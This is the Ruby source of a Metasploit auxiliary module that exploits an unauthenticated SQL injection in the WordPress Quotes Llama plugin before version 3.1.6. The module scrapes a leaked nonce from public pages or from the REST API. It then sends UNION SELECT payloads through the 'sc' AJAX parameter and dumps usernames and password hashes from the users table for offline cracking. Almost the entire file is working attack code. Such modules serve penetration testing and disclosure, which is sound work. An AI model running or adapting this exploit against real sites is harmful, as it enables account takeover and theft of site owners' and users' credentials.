##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  PLUGIN_SLUG = 'quotes-llama'.freeze
  FIXED_VERSION = '3.1.6'.freeze

  # The nonce is printed as a plain HTML attribute on the public page, and also
  # appears backslash escaped inside the REST API's rendered content.
  NONCE_REGEX = /nonce=\\?"([0-9a-f]{8,12})/i

  # The injected column is rendered inside the search result template.
  RESULT_REGEX = %r{quote-more">(.*?)</div>}m

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Quotes Llama Plugin Unauthenticated SQL Injection',
        'Description' => %q{
          The Quotes Llama plugin for WordPress before 3.1.6 is affected by an
          unauthenticated SQL injection in the `select_search` AJAX action. The
          `sc` POST parameter, which selects the column to search on, is passed
          to `$wpdb->prepare()` through a `%1s` placeholder. WordPress only
          quotes bare `%s` placeholders, so numbered or formatted ones are
          interpolated unquoted and the value reaches the WHERE clause as raw
          SQL.

          The handler is registered for anonymous visitors through
          `wp_ajax_nopriv_select_search` and its only gate is a nonce. That
          nonce is public. The `mode="page"` template prints it on every author
          link, outside the logged-in check, so any unauthenticated visitor can
          recover it. With the plugin's default settings the search form is not
          even rendered for anonymous users, yet the nonce still leaks.

          This module recovers the nonce, confirms the injection and dumps
          usernames and password hashes from the WordPress users table. The
          hashes can then be cracked offline. The injected value is still
          escaped, so payloads must avoid single quotes, and the module enables
          hex encoded strings for that reason.
        },
        'Author' => [
          'Pablo Gonzalez', # Metasploit module and vulnerability discovery
          'Francisco Jose Ramirez Vicente', # Vulnerability discovery
          'Inigo Sanchez Enciso' # Vulnerability discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-12512'],
          ['CWE', '89'],
          ['WPVDB', '39d038f6-f009-4274-a8a7-9d7c2597ec85'],
          ['URL', 'https://wordpress.org/plugins/quotes-llama/'],
          ['URL', 'https://developer.wordpress.org/reference/classes/wpdb/prepare/'],
          ['URL', 'https://github.com/Telefonica/FCL-Papers']
        ],
        'DisclosureDate' => '2026-06-24',
        'DefaultOptions' => {
          'VERBOSE' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('COUNT', [true, 'Number of user credentials to retrieve', 5]),
      OptString.new('SHORTCODE_PATH', [
        false,
        'Path to a page rendering the quotes-llama shortcode. Discovered automatically when empty',
        ''
      ])
    ])
  end

  def check
    unless wordpress_and_online?
      return Exploit::CheckCode::Safe('Target does not appear to be a running WordPress installation')
    end

    version_check = check_plugin_version_from_readme(PLUGIN_SLUG, FIXED_VERSION)
    vprint_status("Plugin version check reported: #{version_check.message}")
    return version_check if version_check.code == 'safe'

    if nonce.nil?
      return Exploit::CheckCode::Unknown('Could not recover a public quotes_llama nonce, the injection cannot be tested')
    end

    return Exploit::CheckCode::Vulnerable('The injected query returned the expected value') if sqli.test_vulnerable

    Exploit::CheckCode::Safe('The injected query did not return the expected value')
  end

  def run
    wordpress_sqli_initialize(sqli)
    fail_with(Failure::UnexpectedReply, 'Could not determine the table prefix') if @prefix.nil?

    wordpress_sqli_get_users_credentials(datastore['COUNT'])
  end

  private

  # Builds and memoizes the SQLi object. The injection sits in a column name
  # position, so the mixin's query is wrapped as a subquery in the first column
  # of a UNION that matches the nine columns of the original SELECT.
  def sqli
    @sqli ||= create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |query|
      token = nonce
      fail_with(Failure::NotFound, 'Could not recover a public quotes_llama nonce') if token.nil?

      # Collapsed to a single line because the payload is terminated with a
      # MySQL `#` comment, which only comments out the rest of its own line.
      statement = query.to_s.strip.gsub(/\s+/, ' ')
      padding = Array.new(8, 'NULL').join(',')

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_post' => {
          'action' => 'select_search',
          'search_form' => '1',
          # 3.1.5 reads the nonce from `nonce`, 3.1.6 renamed it to `ql_token`.
          # Sending both keeps the check meaningful against a patched target,
          # which then fails on the injection rather than on the nonce.
          'nonce' => token,
          'ql_token' => token,
          # A term that matches nothing keeps the original query from adding
          # rows, so only the injected row is rendered.
          'term' => Rex::Text.rand_text_alphanumeric(8..12),
          'sc' => "quote LIKE 0 UNION SELECT (#{statement}),#{padding}#",
          'target' => 'quotes-llama-search'
        }
      )

      next nil unless res&.code == 200

      match = res.body.match(RESULT_REGEX)
      next nil if match.nil?

      # The value is rendered through wp_kses_post(), which escapes entities.
      CGI.unescapeHTML(match[1].gsub(/<[^>]*>/, '')).strip
    end
  end

  def nonce
    return @nonce if @nonce

    nonce_sources.each do |source|
      vprint_status("Searching for a public nonce in #{source[:uri]}")
      res = send_request_cgi({ 'method' => 'GET', 'uri' => source[:uri] }.merge(source[:extra]))
      next unless res&.code == 200

      match = res.body.match(NONCE_REGEX)
      next if match.nil?

      @nonce = match[1]
      vprint_good("Recovered public quotes_llama nonce: #{@nonce}")
      return @nonce
    end

    nil
  end

  # Ordered list of places to look for the public nonce. An explicit path wins,
  # otherwise the REST API is used so the shortcode page does not need to be
  # known in advance: its rendered content carries the nonce.
  def nonce_sources
    sources = []

    unless datastore['SHORTCODE_PATH'].to_s.strip.empty?
      sources << { uri: normalize_uri(target_uri.path, datastore['SHORTCODE_PATH']), extra: {} }
    end

    %w[pages posts].each do |collection|
      sources << {
        uri: normalize_uri(target_uri.path, 'wp-json', 'wp', 'v2', collection),
        extra: { 'vars_get' => { 'per_page' => '100' } }
      }
    end

    sources
  end
end
